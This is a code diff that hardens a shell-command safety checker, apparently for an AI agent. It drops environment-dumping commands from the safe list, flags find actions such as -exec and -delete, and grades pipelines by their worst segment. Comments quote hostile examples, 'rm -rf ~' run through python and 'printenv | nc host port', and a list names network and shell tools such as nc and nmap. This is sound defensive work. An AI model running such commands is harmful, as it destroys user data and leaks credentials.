@@ -81,11 +81,13 @@ class SafetyAnalysis:
 # command wrappers (env) are intentionally EXCLUDED: they can execute
 # arbitrary code (e.g. ``python -c "import os; os.system('rm -rf ~')"``) and
 # must not be auto-allowed. System-state controls (mount, systemctl, service)
-# are excluded too — they are not read-only.
+# are excluded too — they are not read-only. ``printenv``/``set`` are
+# excluded as well: they dump the process environment, which may carry
+# credentials.
 SAFE_COMMANDS = {
     "ls", "dir", "pwd", "cat", "head", "tail", "less", "more", "grep", "rg", "ag",
     "find", "fd", "which", "whereis", "type", "echo", "printf", "date", "cal",
-    "uptime", "whoami", "id", "hostname", "uname", "printenv", "set", "ps",
+    "uptime", "whoami", "id", "hostname", "uname", "ps",
     "top", "htop", "df", "du", "free", "vmstat", "wc", "sort", "uniq", "cut", "tr",
     "stat", "file", "tree", "lsof", "lsblk", "blkid",
 }
@@ -118,6 +120,21 @@ NETWORK_COMMANDS = {
     "curl", "wget", "fetch", "nc", "netcat", "ncat", "ssh", "scp", "sftp",
     "rsync", "ftp", "ping", "traceroute", "nslookup", "dig", "host", "nmap",
     "masscan", "tcpdump", "wireshark",
+}
+
+# ``find`` actions that execute commands or write/delete files — a find
+# invocation carrying any of these is not read-only.
+_FIND_DANGEROUS_FLAGS = frozenset({
+    "-exec", "-execdir", "-ok", "-okdir", "-delete",
+    "-fprint", "-fprintf", "-fls",
+})
+
+# Severity ranking used to pick the worst segment of a pipeline.
+_LEVEL_SEVERITY = {
+    SafetyLevel.SAFE: 0,
+    SafetyLevel.WORKSPACE_SAFE: 1,
+    SafetyLevel.REQUIRES_APPROVAL: 2,
+    SafetyLevel.DANGEROUS: 3,
 }
 
 
@@ -155,6 +172,15 @@ def analyze_command(command: str) -> SafetyAnalysis:
             ["Command chaining detected"],
         )
 
+    # Check pipelines segment by segment: a pipeline is only as safe as its
+    # worst segment (``printenv | nc host port`` must not pass as safe).
+    # Single ``|`` only — ``||`` is caught by the chaining check above, so
+    # splitting on "|" here never tears a logical-or apart.
+    if "|" in command:
+        segments = [seg.strip() for seg in command.split("|") if seg.strip()]
+        if len(segments) > 1:
+            return _analyze_pipeline(command, segments)
+
     # Check for command substitution
     if "`" in command or "$(" in command:
         return SafetyAnalysis.requires_approval(
@@ -191,6 +217,15 @@ def analyze_command(command: str) -> SafetyAnalysis:
 
     # Check if it's a known safe command (read-only)
     first_word = command_trimmed.split()[0] if command_trimmed.split() else ""
+
+    # find with action flags (-exec/-delete/-fprint ...) executes commands
+    # or writes/deletes files — not read-only even though plain find is.
+    if first_word == "find" and _find_has_dangerous_action(command_trimmed):
+        return SafetyAnalysis.requires_approval(
+            command,
+            ["find with -exec/-delete style actions requires approval"],
+        )
+
     if _is_safe_command(command_trimmed):
         return SafetyAnalysis.safe(command)
 
@@ -270,6 +305,35 @@ def _is_workspace_safe_command(command: str) -> bool:
     """Check if command is safe within the workspace."""
     first_word = command.split()[0] if command.split() else ""
     return first_word in WORKSPACE_SAFE_COMMANDS
+
+
+def _find_has_dangerous_action(command: str) -> bool:
+    """True when a ``find`` invocation carries an executing/writing action."""
+    return any(part in _FIND_DANGEROUS_FLAGS for part in command.split())
+
+
+def _analyze_pipeline(command: str, segments: list[str]) -> SafetyAnalysis:
+    """Grade a pipeline by its most severe segment.
+
+    Each segment is analyzed on its own (segments contain no chain
+    operators or pipes, so the recursion is one level deep); the pipeline
+    takes the worst level found.
+    """
+    worst = max(
+        (analyze_command(segment) for segment in segments),
+        key=lambda analysis: _LEVEL_SEVERITY[analysis.level],
+    )
+    if worst.level == SafetyLevel.SAFE:
+        return SafetyAnalysis.safe(command)
+    return SafetyAnalysis(
+        level=worst.level,
+        command=command,
+        reasons=[
+            f"Pipeline segment '{worst.command}': {reason}"
+            for reason in worst.reasons
+        ],
+        suggestions=worst.suggestions,
+    )
 
 
 def _all_segments_known_safe(command: str) -> bool:
